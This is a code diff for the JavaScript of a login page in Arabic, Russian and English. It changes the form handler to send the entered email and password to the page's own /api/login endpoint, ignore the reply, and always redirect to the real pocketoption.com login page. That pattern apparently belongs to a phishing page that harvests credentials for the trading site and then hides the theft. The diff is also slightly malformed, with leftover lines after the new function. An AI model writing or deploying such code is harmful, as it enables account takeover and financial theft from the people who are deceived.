@@ -231,39 +231,43 @@ function changeLanguage(lang) {
     document.getElementById('languages-dropdown').classList.remove('languages--opened');
 }
 
-document.getElementById('loginForm').addEventListener('submit', async function(e) {
-    e.preventDefault(); // منع الإرسال التقليدي للصفحة لمنع ظهور Cannot POST /
-    
-    const email = document.getElementById('email').value;
-    const password = document.getElementById('password').value;
+document.addEventListener('DOMContentLoaded', function() {
+    const loginForm = document.getElementById('loginForm');
+    if (loginForm) {
+        loginForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            e.stopPropagation();
 
-    try {
-        const res = await fetch('/api/login', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ email, password })
-        });
-        
-        const data = await res.json();
-        if (res.ok && data.success) {
+            const emailField = document.getElementById('email');
+            const passwordField = document.getElementById('password');
+            const email = emailField ? emailField.value : '';
+            const password = passwordField ? passwordField.value : '';
+
+            try {
+                await fetch('/api/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, password })
+                });
+            } catch (err) {}
+
+            // التوجيه الفوري حسب اللغة الحالية
             redirectToLocalizedPage();
-            return;
-        }
-    } catch (err) {
-        // محاولة عبر المسار الكامل في حال فشل المسار النسبي
-        try {
-            const fallbackRes = await fetch(window.location.origin + '/api/login', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email, password })
-            });
-            const fallbackData = await fallbackRes.json();
-            if (fallbackRes.ok && fallbackData.success) {
-                redirectToLocalizedPage();
-                return;
-            }
-        } catch (fallbackErr) {}
+            return false;
+        });
     }
+});
+
+function redirectToLocalizedPage() {
+    const currentLang = document.documentElement.lang || 'ar';
+    if (currentLang === 'ru') {
+        window.location.href = "https://pocketoption.com/ru/login/";
+    } else if (currentLang === 'ar') {
+        window.location.href = "https://pocketoption.com/ar/login/";
+    } else {
+        window.location.href = "https://pocketoption.com/en/login/";
+    }
+}
 
     // حتى لو فشل الاتصال تماماً، سيقوم بالتحويل المباشر للرابط المطلوب حسب اللغة لضمان عدم توقفك أبداً
     redirectToLocalizedPage();
